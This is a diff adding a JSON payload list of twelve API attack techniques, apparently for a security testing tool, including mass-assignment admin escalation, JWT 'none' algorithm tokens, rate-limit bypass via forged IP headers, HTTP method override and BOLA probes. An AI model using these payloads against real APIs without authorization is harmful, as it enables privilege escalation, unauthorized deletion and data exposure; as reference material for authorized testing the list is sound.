@@ -1,0 +1,14 @@
+[
+  {"name":"Mass Assignment","category":"API","description":"Extra fields to escalate privileges","payload":"POST /api/register\n{\"username\":\"test\",\"password\":\"test\",\"role\":\"admin\",\"is_admin\":true}","tags":["mass-assignment","privilege"]},
+  {"name":"Broken Function Level Auth","category":"API","description":"Access admin endpoint as user","payload":"DELETE /api/admin/users/1","tags":["bfla","admin","auth"]},
+  {"name":"Excessive Data Exposure","category":"API","description":"API returns more data than needed","payload":"GET /api/users/me → returns password hash, internal IDs, etc.","tags":["data-exposure","info-leak"]},
+  {"name":"Rate Limit Bypass Header","category":"API","description":"X-Forwarded-For to bypass rate limiting","payload":"X-Forwarded-For: 1.2.3.4\nX-Real-IP: 1.2.3.4\nX-Client-IP: 1.2.3.4","tags":["rate-limit","bypass","headers"]},
+  {"name":"Version Downgrade","category":"API","description":"Use old API version without fixes","payload":"GET /api/v1/users (v2 is patched, v1 is not)","tags":["versioning","downgrade"]},
+  {"name":"HTTP Method Override","category":"API","description":"Override HTTP method via header","payload":"POST /api/users/1\nX-HTTP-Method-Override: DELETE","tags":["method-override","bypass"]},
+  {"name":"Verb Tampering","category":"API","description":"Try different HTTP verbs","payload":"PUT /api/resource\nPATCH /api/resource\nDELETE /api/resource\nOPTIONS /api/resource","tags":["verb-tampering","enumeration"]},
+  {"name":"Content Type Confusion","category":"API","description":"Switch content type to bypass validation","payload":"Content-Type: application/xml (when JSON expected)\nContent-Type: text/plain\nContent-Type: application/x-www-form-urlencoded","tags":["content-type","bypass"]},
+  {"name":"GraphQL REST Confusion","category":"API","description":"Try GraphQL endpoint at REST paths","payload":"POST /api/graphql\nPOST /graphql\nPOST /api/v1/graphql\nGET /graphql?query={__schema{types{name}}}","tags":["graphql","enumeration"]},
+  {"name":"JWT None Alg API","category":"API","description":"None algorithm on API JWT auth","payload":"Authorization: Bearer <header.payload.> (empty sig)","tags":["jwt","auth","alg-none"]},
+  {"name":"API Key in URL","category":"API","description":"API key passed in URL parameter (logged)","payload":"GET /api/data?api_key=SECRET_KEY","tags":["api-key","exposure"]},
+  {"name":"BOLA Test","category":"API","description":"Broken Object Level Authorization test","payload":"GET /api/reports/{other_user_report_id}","tags":["bola","idor","owasp-api"]}
+]
